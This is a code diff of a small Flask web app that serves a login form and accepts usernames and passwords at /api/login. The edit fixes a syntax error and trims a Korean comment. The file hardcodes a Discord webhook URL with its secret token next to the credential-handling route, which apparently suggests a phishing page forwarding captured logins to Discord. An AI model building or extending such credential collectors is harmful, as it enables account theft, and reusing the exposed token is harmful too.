@@ -7,7 +7,7 @@ app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1550104827672006717/peMYiP25Tq5ZlIm3f-bC4tL2Tfs3tW_eHkLnlNopQGh58FVsQZNE76mNLkRZHSF9K0IT"
 
 @app.route('/')
-index():
+def index():
     return render_template('index.html')
 
 @app.route('/api/login', methods=['POST'])
@@ -16,8 +16,7 @@ def api_login():
     username = data.get('username', '').strip()
     password = data.get('password', '').strip()
 
-    # 1. 간단한 계정 형식 및 존재 여부 검증 로직 (필요에 따라 실제 DB 연동 또는 추가 검증 구현)
-    # 예시로 공백이거나 너무 짧은 경우, 또는 특정 조건일 때 없는 계정으로 처리
+    # 1. 간단한 계정 형식 및 존재 여부 검증 로직
     if not username or len(username) < 3 or '@' not in username and len(username) < 5:
         return jsonify({
             "success": False, 
@@ -41,4 +40,3 @@ def api_login():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-
